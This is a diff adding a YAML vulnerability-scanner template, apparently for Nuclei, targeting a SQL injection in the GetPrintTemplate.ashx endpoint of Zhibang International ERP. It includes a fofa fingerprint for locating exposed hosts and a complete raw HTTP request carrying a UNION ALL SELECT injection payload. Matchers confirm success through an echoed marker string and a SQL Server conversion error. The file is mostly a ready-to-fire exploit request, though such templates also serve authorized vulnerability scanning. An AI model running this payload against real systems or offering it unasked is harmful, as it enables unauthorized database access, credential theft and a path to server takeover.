@@ -1,0 +1,30 @@
+id: zhibangguojiERP-GetPrintTemplate_ashx-sql
+
+info:
+  name: "智邦国际ERP GetPrintTemplate.ashx接口SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="-682445886"
+      智邦国际ERP系统中GetPrintTemplate.ashx处理接口存在SQL语法注入安全缺陷。攻击者可通过构造恶意SQL查询，绕过身份验证机制直接访问后端数据库，实现敏感数据提取（包括但不限于管理员凭据、用户隐私信息）。在具备高权限访问条件下，攻击者可能通过注入点执行任意系统命令，完成Web Shell部署并实现对服务器资源的控制。
+  reference:
+  - https://mp.weixin.qq.com/s/qOzPdQcvZJJzPcTimBHFHQ
+  tags: 智邦国际ERP
+
+http:
+- raw:
+  - |
+    GET /SYSN/json/pcclient/GetPrintTemplate.ashx?sort=1&ord=-1+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2869%29%2BCHAR%2899%29%2BCHAR%2881%29%2BCHAR%2881%29%2BCHAR%28104%29%2BCHAR%2889%29%2BCHAR%2879%29%2BCHAR%28103%29%2BCHAR%28109%29%2BCHAR%28111%29%2BCHAR%28117%29%2BCHAR%2866%29%2BCHAR%2877%29%2BCHAR%2875%29%2BCHAR%28122%29%2BCHAR%2866%29%2BCHAR%2881%29%2BCHAR%28111%29%2BCHAR%28105%29%2BCHAR%2865%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28109%29%2BCHAR%2865%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%2890%29%2BCHAR%2871%29%2BCHAR%2886%29%2BCHAR%28110%29%2BCHAR%28113%29%2BCHAR%2875%29%2BCHAR%2880%29%2BCHAR%28104%29%2BCHAR%2879%29%2BCHAR%28116%29%2BCHAR%2879%29%2BCHAR%2871%29%2BCHAR%28103%29%2BCHAR%2873%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL--+vlPx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qjzzqEcQQhYOgmouBMKzBQoiAvjmAkvZGVnqKPhOtOGgIqkxjq'
+    - '转换成数据类型 int 时失败'
+    condition: and
+  - type: status
+    status:
+    - 200
